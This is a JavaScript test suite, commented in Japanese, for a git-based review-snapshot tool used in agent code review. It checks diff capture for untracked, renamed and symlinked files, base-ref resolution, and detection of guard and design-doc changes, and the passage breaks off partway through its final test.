import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  changedFilesBetween,
  classifyFile,
  createSnapshot,
  detectGuardChange,
  detectSemanticDocChange,
  headerPath,
  latestSnapshot,
  parseNameStatus,
  parseNumstat,
  resolveBaseRef,
  reviewRoot,
  splitPatchByFile,
} from '../scripts/agent/review-snapshot.js';
import { makeTmpGitRepo, sh, write } from './helpers/tmpGitRepo.js';

// 一時 git リポジトリでの結合テスト。
// snapshot は「レビュー対象 diff を取りこぼさない」ことが最重要なので、
// working tree / untracked / 前回 snapshot からの修正 diff を実リポジトリで検証する。

function makeRepo() {
  const dir = makeTmpGitRepo('review-snapshot-');
  write(dir, 'src/base.js', 'export const a = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'base']);
  sh(dir, ['branch', 'feature']);
  sh(dir, ['checkout', '-q', 'feature']);
  return dir;
}

test('classifyFile: rename エントリは oldPath も classify 入力に含める（code密輸対策 #446 round2）', (t) => {
  // makeRepo() は base コミットに src/base.js のみを含むため、rename 元を merge-base に
  // 存在させるには main 側で先にコミットしてから feature を分岐する必要がある
  const dir = makeTmpGitRepo('review-snapshot-');
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/evil.js', 'export const payload = 1;\nexport const filler = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'base with src/evil.js']);
  sh(dir, ['branch', 'feature']);
  sh(dir, ['checkout', '-q', 'feature']);
  mkdirSync(join(dir, 'docs'), { recursive: true });
  sh(dir, ['mv', 'src/evil.js', 'docs/evil.md']);
  sh(dir, ['commit', '-qm', 'rename to docs/evil.md']);

  const { changedFiles } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const renamed = changedFiles.find((f) => f.path === 'docs/evil.md');
  assert.ok(renamed, `rename エントリが見つからない: ${JSON.stringify(changedFiles)}`);
  assert.equal(renamed.status, 'R');
  assert.equal(renamed.oldPath, 'src/evil.js');
  // rename 元（src/evil.js）が code だったため、rename 先が prose に見える拡張子（.md）でも
  // code 密輸として扱われる
  assert.equal(renamed.code, true);
});

test('snapshot: merge-base・完全 diff・変更ファイル分類を生成する', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'feature']);

  const { manifest, changedFiles, dir: snapDir } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(manifest.mergeBase, sh(dir, ['rev-parse', 'main']).trim());
  assert.equal(manifest.previousSnapshotId, null);
  assert.equal(manifest.dirty, false);
  assert.deepEqual(
    changedFiles.map((f) => [f.path, f.status]),
    [['src/feature.js', 'A']],
  );
  const patch = readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8');
  assert.match(patch, /\+export const b = 2;/);
  // 初回は修正 diff が存在しない（空）
  assert.equal(readFileSync(join(snapDir, 'previous-to-current.patch'), 'utf-8'), '');
});

test('snapshot: working tree の未コミット変更を完全 diff に含める（作業ツリーは変更しない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/base.js', 'export const a = 999;\n');

  const before = sh(dir, ['status', '--porcelain']);
  const { manifest, dir: snapDir } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(manifest.dirty, true);
  assert.match(
    readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8'),
    /\+export const a = 999;/,
  );
  assert.equal(sh(dir, ['status', '--porcelain']), before, 'snapshot 生成は作業ツリーを変更しない');
});

test('snapshot: untracked ファイルもレビュー対象 diff に含める（無条件の除外をしない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/brand-new.js', 'export const c = 3;\n');

  const { manifest, changedFiles, dir: snapDir } = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.deepEqual(manifest.untracked, ['src/brand-new.js']);
  assert.ok(changedFiles.some((f) => f.path === 'src/brand-new.js' && f.status === 'U'));
  const patch = readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8');
  assert.match(patch, /\+export const c = 3;/);
  assert.match(patch, /diff --git a\/src\/brand-new\.js b\/src\/brand-new\.js/);
  assert.deepEqual(
    splitPatchByFile(patch).map((f) => f.path),
    ['src/brand-new.js'],
  );
});

test('snapshot: 2回目は前回 snapshot からの修正 diff を出す', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'f1']);
  const first = createSnapshot({ cwd: dir, baseRef: 'main' });

  write(dir, 'src/fix.js', 'export const d = 4;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'f2']);
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  assert.equal(second.manifest.previousSnapshotId, first.snapshotId);
  const fix = readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8');
  assert.match(fix, /\+export const d = 4;/);
  assert.ok(!fix.includes('export const b = 2;'), '修正 diff に前回までの変更が混ざってはいけない');
  // 完全 diff は引き続き merge-base からの全量（正本）
  const full = readFileSync(join(second.dir, 'base-to-current.patch'), 'utf-8');
  assert.match(full, /\+export const b = 2;/);
  assert.match(full, /\+export const d = 4;/);
  assert.deepEqual(second.changedFiles.map((f) => f.path).sort(), ['src/feature.js', 'src/fix.js']);
});

test('snapshot: dirty な前回 snapshot からの修正 diff も取れる（stash create で具現化する）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/base.js', 'export const a = 2;\n');
  const first = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(first.manifest.dirty, true);
  assert.notEqual(first.manifest.currentCommit, first.manifest.headSha);

  write(dir, 'src/base.js', 'export const a = 3;\n');
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });
  const fix = readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8');
  assert.match(fix, /-export const a = 2;/);
  assert.match(fix, /\+export const a = 3;/);
});

test('snapshot: latestSnapshot が最後の snapshot を返す', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/x.js', 'x\n');
  createSnapshot({ cwd: dir, baseRef: 'main' });
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(latestSnapshot(dir).snapshotId, second.snapshotId);
  assert.equal(latestSnapshot(dir).manifest.seq, 2);
});

test('snapshot: 出力先は .git 配下（作業ツリーを汚さない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  assert.equal(reviewRoot(dir), join(dir, '.git', 'agent-review'));
  write(dir, 'src/x.js', 'x\n');
  createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.ok(
    !sh(dir, ['status', '--porcelain']).includes('agent-review'),
    'snapshot 成果物が作業ツリーの untracked として現れてはいけない',
  );
});

test('resolveBaseRef: 解決できない ref は fail-loud（黙って別の base を使わない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  assert.equal(resolveBaseRef(dir, 'main').sha, sh(dir, ['rev-parse', 'main']).trim());
  assert.throws(() => resolveBaseRef(dir, 'no-such-ref'), /base ref を解決できません/);
});

// ---------------------------------------------------------------------------
// シグナル検出
// ---------------------------------------------------------------------------

test('detectGuardChange: 正規表現・バリデーション・分類器の変更を検出する', () => {
  assert.equal(detectGuardChange('+const RE = /^a[b]+c$/i;\n', []), true);
  assert.equal(detectGuardChange('+  if (!validateWorkspaceRootPath(p)) return;\n', []), true);
  assert.equal(detectGuardChange('+  return new RegExp(pattern);\n', []), true);
  assert.equal(detectGuardChange('+// ただのコメント追加\n+const total = a + b;\n', []), false);
  assert.equal(detectGuardChange('', []), false);
});

test('detectSemanticDocChange: 誤字修正と拘束力のある記述の変更を区別する', () => {
  const designFile = [
    { path: 'docs/agent-workflows/x.md', status: 'M', designDoc: true, kind: 'docs-design' },
  ];
  const typo = [
    'diff --git a/docs/agent-workflows/x.md b/docs/agent-workflows/x.md',
    '--- a/docs/agent-workflows/x.md',
    '+++ b/docs/agent-workflows/x.md',
    '-このさぎょうを行う。',
    '+この作業を行う。',
    '',
  ].join('\n');
  assert.equal(detectSemanticDocChange(typo, designFile), false, '誤字修正は意味的変更ではない');

  const semantic = typo.replace('+この作業を行う。', '+完了条件: テストが green であること。');
  assert.equal(detectSemanticDocChange(semantic, designFile), true);

  const structural = typo.replace('+この作業を行う。', '+- 新しい箇条書きの規則');
  assert.equal(detectSemanticDocChange(structural, designFile), true, '構造行の増減は意味的変更');
});

test('detectSemanticDocChange: fail-closed（判定材料が無い・ファイル追加削除は意味的変更）', () => {
  const added = [
    { path: 'docs/agent-workflows/new.md', status: 'A', designDoc: true, kind: 'docs-design' },
  ];
  assert.equal(detectSemanticDocChange('', added), true);
  const modified = [
    { path: 'docs/agent-workflows/x.md', status: 'M', designDoc: true, kind: 'docs-design' },
  ];
  assert.equal(detectSemanticDocChange('', modified), true, 'patch 無し＝落とせない');
  assert.equal(detectSemanticDocChange('anything', []), false, 'prose の変更が無ければ対象外');
});

test('detectSemanticDocChange: コードファイルの hunk を prose の意味的変更と誤認しない', () => {
  const files = [
    { path: 'docs/agent-workflows/x.md', status: 'M', designDoc: true, kind: 'docs-design' },
    { path: 'src/a.js', status: 'M', code: true, kind: 'code' },
  ];
  const patch = [
    'diff --git a/docs/agent-workflows/x.md b/docs/agent-workflows/x.md',
    '--- a/docs/agent-workflows/x.md',
    '+++ b/docs/agent-workflows/x.md',
    '-てすと',
    '+テスト',
    'diff --git a/src/a.js b/src/a.js',
    '--- a/src/a.js',
    '+++ b/src/a.js',
    '+// この処理は必須である（成果物を作る）',
    '',
  ].join('\n');
  assert.equal(detectSemanticDocChange(patch, files), false);
});

test('classifyFile: 高リスク・設計文書・記憶レコード・テスト・依存を分類する', () => {
  assert.equal(classifyFile('src/lib/db.js').highRisk, true);
  assert.equal(classifyFile('src/lib/writingRules.js').highRisk, false);
  assert.equal(classifyFile('docs/agent-workflows/x.md').designDoc, true);
  assert.equal(classifyFile('docs/agent-memory/records/a.json').recordDoc, true);
  assert.equal(classifyFile('tests/a.test.js').test, true);
  assert.equal(classifyFile('e2e/editor/a.spec.js').test, true);
  assert.equal(classifyFile('package-lock.json').kind, 'dep');
  assert.equal(classifyFile('CLAUDE.md').conventionDoc, true);
  assert.equal(classifyFile('docs/MVP_PLAN.md').specAnchor, true);
  assert.equal(classifyFile('docs/planning/x.md').riskTable, true);
});

test('splitPatchByFile: 削除ファイルは旧パスで拾う', () => {
  const patch = [
    'diff --git a/src/gone.js b/src/gone.js',
    '--- a/src/gone.js',
    '+++ /dev/null',
    '-export const gone = 1;',
    '',
  ].join('\n');
  assert.deepEqual(splitPatchByFile(patch), [
    { path: 'src/gone.js', lines: ['-export const gone = 1;'] },
  ]);
});

test('resolveBaseRef: stale な候補があっても HEAD に最も近い merge-base を選ぶ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // origin/main を stale な地点（初期コミット）に固定し、ローカル main を先へ進める
  const stale = sh(dir, ['rev-parse', 'main']).trim();
  sh(dir, ['update-ref', 'refs/remotes/origin/main', stale]);
  sh(dir, ['checkout', '-q', 'main']);
  write(dir, 'src/base.js', 'export const a = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'main advanced']);
  const fresh = sh(dir, ['rev-parse', 'main']).trim();
  sh(dir, ['checkout', '-q', 'feature']);
  sh(dir, ['merge', '-q', 'main', '-m', 'merge main']);

  // 固定優先順（origin/main が先）なら stale 側に倒れる。最近傍選択なら新しい方を選ぶ
  const picked = resolveBaseRef(dir, null);
  assert.equal(picked.sha, fresh, `stale な origin/main へ倒れている（選択: ${picked.ref}）`);
  assert.notEqual(picked.sha, stale);
});

test('resolveBaseRef: 明示指定は最近傍選択より優先する', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const main = sh(dir, ['rev-parse', 'main']).trim();
  assert.equal(resolveBaseRef(dir, 'main').sha, main);
});

test('resolveBaseRef: remote 未設定なら fetch を skip する（副作用なし。#577）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const picked = resolveBaseRef(dir, null);
  assert.deepEqual(picked.fetches, [
    { ref: 'refs/remotes/origin/main', status: 'skipped', reason: 'remote が無い' },
  ]);
});

test('resolveBaseRef: 明示ローカル base では fetch しない（既存の主流経路の前提を維持）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  assert.deepEqual(resolveBaseRef(dir, 'main').fetches, []);
});

test('resolveBaseRef: remote が到達不能なら fetch は failed でも base 解決は続行する（#577）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  sh(dir, ['update-ref', 'refs/remotes/origin/main', sh(dir, ['rev-parse', 'main']).trim()]);
  sh(dir, ['remote', 'add', 'origin', '/nonexistent/path.git']);
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'feature']);

  const { manifest } = createSnapshot({ cwd: dir, baseRef: null });
  assert.equal(manifest.baseFetch[0].status, 'failed');
  assert.equal(
    manifest.baseFetch[0].reason,
    'fetch に失敗（オフライン・認証・remote 到達不能のいずれか）',
  );
  assert.equal(manifest.counts.changedFiles, 1);
});

test('resolveBaseRef: --base origin/main の明示でも fetch する（D3・risk #4）', (t) => {
  const up = makeRepo();
  const work = mkdtempSync(join(tmpdir(), 'review-snapshot-work-'));
  t.after(() => rmSync(up, { recursive: true, force: true }));
  t.after(() => rmSync(work, { recursive: true, force: true }));
  sh(up, ['checkout', '-q', 'main']);
  execFileSync('git', ['clone', '-q', up, work, '--no-hardlinks'], { stdio: 'ignore' });
  sh(work, ['config', 'user.email', 'test@example.com']);
  sh(work, ['config', 'user.name', 'test']);
  sh(work, ['config', 'commit.gpgsign', 'false']);

  write(up, 'm1.txt', 'm1\n');
  sh(up, ['add', '.']);
  sh(up, ['commit', '-qm', 'main advanced']);
  const fresh = sh(up, ['rev-parse', 'main']).trim();

  const picked = resolveBaseRef(work, 'origin/main');
  assert.equal(picked.sha, fresh, 'stale な origin/main のまま解決している');
  assert.ok(
    picked.fetches.some((f) => f.ref === 'refs/remotes/origin/main' && f.status === 'ok'),
    'origin/main の fetch 結果が返っていない',
  );
});

test('resolveBaseRef: --base origin/main が手元に無くても ref 名から fetch して解決する（A5）', (t) => {
  const up = makeRepo();
  const work = mkdtempSync(join(tmpdir(), 'review-snapshot-work-'));
  t.after(() => rmSync(up, { recursive: true, force: true }));
  t.after(() => rmSync(work, { recursive: true, force: true }));
  sh(up, ['checkout', '-qb', 'feat']);
  write(up, 'f.txt', 'f\n');
  sh(up, ['add', '.']);
  sh(up, ['commit', '-qm', 'feature change']);
  const mainSha = sh(up, ['rev-parse', 'main']).trim();

  // single-branch clone は origin/main の remote-tracking ref 自体を作らない。
  // symbolic-full-name が解決できない状態を再現する（実測: exit 128）
  execFileSync(
    'git',
    ['clone', '-q', '--no-hardlinks', '--single-branch', '--branch', 'feat', up, work],
    { stdio: 'ignore' },
  );
  sh(work, ['config', 'user.email', 'test@example.com']);
  sh(work, ['config', 'user.name', 'test']);
  sh(work, ['config', 'commit.gpgsign', 'false']);

  const picked = resolveBaseRef(work, 'origin/main');
  assert.equal(picked.sha, mainSha, 'ref 名から fetch して自力回復できていない');
  assert.ok(
    picked.fetches.some((f) => f.ref === 'refs/remotes/origin/main' && f.status === 'ok'),
    'origin/main の fetch 結果が返っていない',
  );
});

test('createSnapshot: stale な origin/main を fetch してから base を選ぶ（#577）', (t) => {
  const up = makeRepo();
  const work = mkdtempSync(join(tmpdir(), 'review-snapshot-work-'));
  t.after(() => rmSync(up, { recursive: true, force: true }));
  t.after(() => rmSync(work, { recursive: true, force: true }));
  sh(up, ['checkout', '-q', 'main']);
  // この時点で work の origin/main = base（clone 直後）
  execFileSync('git', ['clone', '-q', up, work, '--no-hardlinks'], { stdio: 'ignore' });
  sh(work, ['config', 'user.email', 'test@example.com']);
  sh(work, ['config', 'user.name', 'test']);
  sh(work, ['config', 'commit.gpgsign', 'false']);

  // up の main を3コミット進める（＝別 PR がマージされた）
  for (let i = 1; i <= 3; i += 1) {
    write(up, `m${i}.txt`, `m${i}\n`);
    sh(up, ['add', '.']);
    sh(up, ['commit', '-qm', `merged ${i}`]);
  }

  // 新しい main から feat ブランチを切り、1ファイル変更してコミット
  sh(up, ['checkout', '-qb', 'feat']);
  write(up, 'f.txt', 'f\n');
  sh(up, ['add', '.']);
  sh(up, ['commit', '-qm', 'feature change']);

  // work は PR ブランチ（feat）だけを fetch する。origin/main は stale なまま
  sh(work, ['fetch', '-q', 'origin', 'feat']);
  sh(work, ['checkout', '-qb', 'feat', 'FETCH_HEAD']);

  const { manifest, changedFiles } = createSnapshot({ cwd: work });
  assert.equal(
    changedFiles.length,
    1,
    `stale base で無関係な既マージコミットが混ざっている: ${JSON.stringify(changedFiles.map((f) => f.path))}`,
  );
  assert.ok(
    manifest.baseFetch.some((f) => f.ref === 'refs/remotes/origin/main' && f.status === 'ok'),
    'origin/main の fetch 結果が manifest に残る',
  );
});

test('createSnapshot: 既に最新な origin/main への fetch は連続2回とも ok・mergeBase 不変（冪等）', (t) => {
  const up = makeRepo();
  const work = mkdtempSync(join(tmpdir(), 'review-snapshot-work-'));
  t.after(() => rmSync(up, { recursive: true, force: true }));
  t.after(() => rmSync(work, { recursive: true, force: true }));
  sh(up, ['checkout', '-q', 'main']);
  execFileSync('git', ['clone', '-q', up, work, '--no-hardlinks'], { stdio: 'ignore' });
  sh(work, ['config', 'user.email', 'test@example.com']);
  sh(work, ['config', 'user.name', 'test']);
  sh(work, ['config', 'commit.gpgsign', 'false']);
  sh(work, ['checkout', '-qb', 'feature']);
  write(work, 'src/feature.js', 'export const b = 2;\n');
  sh(work, ['add', '.']);
  sh(work, ['commit', '-qm', 'feature']);

  const first = createSnapshot({ cwd: work });
  const second = createSnapshot({ cwd: work });
  assert.equal(first.manifest.mergeBase, second.manifest.mergeBase);
  // no-op の fetch（既に最新）が failed として誤報されないことを両方の周回で確かめる
  for (const { manifest } of [first, second]) {
    assert.ok(
      manifest.baseFetch.some((f) => f.ref === 'refs/remotes/origin/main' && f.status === 'ok'),
      `origin/main の fetch が ok になっていない: ${JSON.stringify(manifest.baseFetch)}`,
    );
  }
});

test('snapshot: untracked は前回に無かったものだけ修正 diff へ足す（毎周回「新規」にしない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/untracked.js', 'export const u = 1;\n');
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // untracked はそのまま、別のコミットを積む
  write(dir, 'src/committed.js', 'export const c = 1;\n');
  sh(dir, ['add', 'src/committed.js']);
  sh(dir, ['commit', '-qm', 'c']);
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });
  const fix = readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8');
  assert.match(fix, /\+export const c = 1;/);
  assert.ok(
    !fix.includes('export const u = 1;'),
    '前回にもあった untracked が修正差分へ再掲されている',
  );
  // 完全 diff（正本）には引き続き含まれる
  assert.match(
    readFileSync(join(second.dir, 'base-to-current.patch'), 'utf-8'),
    /\+export const u = 1;/,
  );

  // 新しく増えた untracked は修正差分に載る
  write(dir, 'src/newly.js', 'export const n = 1;\n');
  const third = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.match(
    readFileSync(join(third.dir, 'previous-to-current.patch'), 'utf-8'),
    /\+export const n = 1;/,
  );
});

test('snapshot: git rm --cached 後の書き換えを changedInFix で二重計上しない（#592 / #593）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'x.txt', 'v1\n');
  sh(dir, ['add', 'x.txt']);
  sh(dir, ['commit', '-qm', 'add x']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  sh(dir, ['rm', '--cached', '-q', 'x.txt']);
  write(dir, 'x.txt', 'v2\n');

  const { dir: snapDir } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const { changedInFix } = JSON.parse(readFileSync(join(snapDir, 'changed-files.json'), 'utf-8'));
  const xEntries = changedInFix.filter((f) => f.path === 'x.txt');
  assert.equal(xEntries.length, 1, `x.txt が重複エントリになっている: ${JSON.stringify(xEntries)}`);
  // どちら側が残るかも仕様: commit 差分側（'M'）が残り、untracked 側（'U'）は消える
  assert.equal(
    xEntries[0].status,
    'M',
    `残ったエントリの status が想定と違う: ${JSON.stringify(xEntries)}`,
  );
});

test('snapshot: 古い snapshot の ref を刈り取る（dead ref の無限蓄積を防ぐ）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  for (let i = 0; i < 6; i += 1) {
    write(dir, 'src/base.js', `export const a = ${i};\n`);
    createSnapshot({ cwd: dir, baseRef: 'main' });
  }
  const refs = sh(dir, ['for-each-ref', '--format=%(refname)', 'refs/agent-review'])
    .split('\n')
    .filter(Boolean);
  assert.ok(refs.length <= 3, `refs/agent-review が刈り取られていない: ${refs.join(' / ')}`);
  // 直近 snapshot の修正 diff は引き続き取れる
  write(dir, 'src/base.js', 'export const a = 99;\n');
  const last = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.match(
    readFileSync(join(last.dir, 'previous-to-current.patch'), 'utf-8'),
    /\+export const a = 99;/,
  );
});

test('snapshot: 修正が無い周回では修正差分シグナルが立たない（PR 全体へフォールバックしない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // PR 全体にはガード種の変更がある
  write(dir, 'scripts/agent/guard.js', 'export const RE = /^a[b]+c$/i;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'guard']);
  const first = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(first.manifest.guardChangeInFix, true, '初回は PR 全体が変更分');

  // 何も変えずにもう1周
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8'), '');
  assert.equal(
    second.manifest.guardChangeInFix,
    false,
    '修正差分が空なら guard シグナルは立たない（立つと再探索が無限に再トリガーされる）',
  );
  assert.equal(second.manifest.semanticDocChangeInFix, false);
});

test('snapshot: 修正差分に意味的な docs 変更があればシグナルが立つ', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/x.js', 'x\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'x']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  write(dir, 'docs/agent-workflows/w.md', '# w\n\n完了条件: テストが green であること\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'doc']);
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(second.manifest.semanticDocChangeInFix, true);
});

test('snapshot: 新規 untracked は修正 diff と changedInFix の両方へ載る（トリガーの取りこぼし防止）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/a.js', 'export const a = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'f1']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // 修正 round で新しい設計文書を untracked のまま追加する
  write(dir, 'docs/agent-workflows/new-rule.md', '# w\n\n完了条件: 新しい規則\n');
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  const fix = readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8');
  assert.match(fix, /new-rule\.md/, '修正 diff に新規 untracked が載っていない');

  const changed = JSON.parse(readFileSync(join(second.dir, 'changed-files.json'), 'utf-8'));
  const inFix = changed.changedInFix.find((f) => f.path === 'docs/agent-workflows/new-rule.md');
  assert.ok(
    inFix,
    'patch には載るのに changedInFix に無い（deriveSignals が newFile / designDoc を見落とす）',
  );
  assert.equal(inFix.status, 'U');
  assert.equal(inFix.designDoc, true);
  // 意味的変更の判定も changedInFix を入力にするため、ここが空だと false へ落ちる
  assert.equal(second.manifest.semanticDocChangeInFix, true);
});

test('snapshot: 前回にもあった untracked は修正 diff の「新規」として再掲されない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'docs/agent-workflows/kept.md', '# k\n\n完了条件: 既存\n');
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // untracked はそのまま。別のコミットだけ積む
  write(dir, 'src/other.js', 'export const o = 1;\n');
  sh(dir, ['add', 'src/other.js']);
  sh(dir, ['commit', '-qm', 'c']);
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  assert.ok(!second.changedFiles.some((f) => f.path === 'src/nonexistent.js'), 'sanity');
  const changed = JSON.parse(readFileSync(join(second.dir, 'changed-files.json'), 'utf-8'));
  assert.ok(
    !changed.changedInFix.some((f) => f.path === 'docs/agent-workflows/kept.md'),
    '前回にもあった untracked が毎周回「修正差分の新規」として現れている',
  );
  // 完全 diff（正本）には引き続き含まれる
  assert.ok(second.changedFiles.some((f) => f.path === 'docs/agent-workflows/kept.md'));
});

// 上のテストの裏面。パス一致だけで「再掲しない」と決めると、既存 untracked の**書き換え**が
// 修正差分・changedInFix・全シグナルから消え、ガードを無効化しても全観点が skip される
// （最終独立の敵対的レビューで実測）。台帳の内容ハッシュで書き換えを検出する
test('snapshot: 既存 untracked の書き換えは修正 diff に載る', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'scripts/agent/guard.js', 'export const validate = (p) => p.length > 0;\n');
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // untracked のまま中身だけガードを無効化する
  write(dir, 'scripts/agent/guard.js', 'export const validate = () => true;\n');
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  const patch = readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8');
  assert.ok(patch.includes('=> true'), '書き換え後の内容が修正差分に現れる');
  const changed = JSON.parse(readFileSync(join(second.dir, 'changed-files.json'), 'utf-8'));
  assert.ok(
    changed.changedInFix.some((f) => f.path === 'scripts/agent/guard.js'),
    'changedInFix にも載る（patch とずれるとトリガーを取りこぼす）',
  );
  assert.equal(second.manifest.guardChangeInFix, true, 'ガード変更のシグナルが立つ');
});

// 「読めない untracked は unreportedPaths が拾う」は**同じ snapshot 内でしか**成立しない。
// 前周回で読めずハッシュが残らなかったものが実ファイルへ差し替わると、パスは既知・ハッシュは
// 不明になり、「未変更」と断定すると fail-closed の網も外れる（減算レビューで実測）
test('snapshot: 前周回に読めなかった untracked が実ファイルへ変わったら修正 diff に載る', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  mkdirSync(join(dir, 'scripts/agent'), { recursive: true });
  symlinkSync('./nowhere', join(dir, 'scripts/agent/guard.js'));
  const first = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.ok(
    first.manifest.unreportedPaths.includes('scripts/agent/guard.js'),
    '1周目は fail-closed',
  );

  rmSync(join(dir, 'scripts/agent/guard.js'));
  write(dir, 'scripts/agent/guard.js', 'export const validate = () => true;\n');
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  const patch = readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8');
  assert.ok(patch.includes('=> true'), '差し替わった内容が修正差分に現れる');
  assert.equal(second.manifest.guardChangeInFix, true, 'ガード変更のシグナルが立つ');
});

// readFileSync は symlink を辿るため、型を確かめずにハッシュを取ると「patch に一度も
// 載っていない内容」の証跡が台帳に残る。次周回に同内容の実ファイルへ差し替わると
// 「既知＝未変更」と誤判定して全シグナルが落ちる（運用性レビューで実測）
test('snapshot: patch に載らなかった symlink の内容を「既知」として扱わない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const body = 'export const validate = () => true;\n';
  write(dir, 'target.txt', body);
  sh(dir, ['add', 'target.txt']);
  sh(dir, ['commit', '-qm', 'c']);
  mkdirSync(join(dir, 'scripts/agent'), { recursive: true });
  symlinkSync(join(dir, 'target.txt'), join(dir, 'scripts/agent/guard.js'));
  const first = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.ok(
    first.manifest.unreportedPaths.includes('scripts/agent/guard.js'),
    '1周目は fail-closed',
  );

  // 同じ内容の実ファイルへ差し替える（内容は一度も patch に載っていない）
  rmSync(join(dir, 'scripts/agent/guard.js'));
  write(dir, 'scripts/agent/guard.js', body);
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  const patch = readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8');
  assert.ok(patch.includes('=> true'), '一度も patch に載っていない内容が修正差分に現れる');
  assert.equal(second.manifest.guardChangeInFix, true, 'ガード変更のシグナルが立つ');
});

test('snapshot: untracked の削除も修正 diff の変更として残る', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'docs/agent-workflows/gone.md', '# g\n\n完了条件: 消える前\n');
  createSnapshot({ cwd: dir, baseRef: 'main' });

  rmSync(join(dir, 'docs/agent-workflows/gone.md'));
